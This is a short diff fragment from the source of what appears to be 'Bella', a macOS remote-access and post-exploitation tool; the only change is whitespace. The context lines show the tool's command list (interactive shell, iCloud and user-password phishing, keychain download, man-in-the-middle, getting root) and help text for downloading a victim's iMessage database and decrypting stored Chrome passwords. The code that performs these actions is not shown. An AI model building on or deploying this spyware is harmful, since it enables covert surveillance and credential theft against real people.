@@ -35,7 +35,7 @@ yellow_star = "%s[*] %s" % (yellow, endC)
 commands = ['iCloud_query', 'bella_version', 'set_client_name', 'update_server', 'interactive_shell','upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
 
 def manual():
-    value = "\n%sBella Version%s\nReturn Bella's version / release number.\nUsage: %sbella_version%s\nRequirements: None\n" % (underline + bold + yellow, endANSI, bold, endANSI)
+	value = "\n%sBella Version%s\nReturn Bella's version / release number.\nUsage: %sbella_version%s\nRequirements: None\n" % (underline + bold + yellow, endANSI, bold, endANSI)
 	value += "\n%sChat History%s\nDownload the user's macOS iMessage database.\nUsage: %schat_history%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%sCheck Backups%s\nEnumerate the user's local iOS backups.\nUsage: %scheck_backups%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%sChrome Dump%s\nDecrypt user passwords stored in Google Chrome profiles.\nUsage: %schrome_dump%s\nRequirements: Chrome SS Key [see chrome_safe_storage]\n" % (underline + bold + green, endANSI, bold, endANSI)
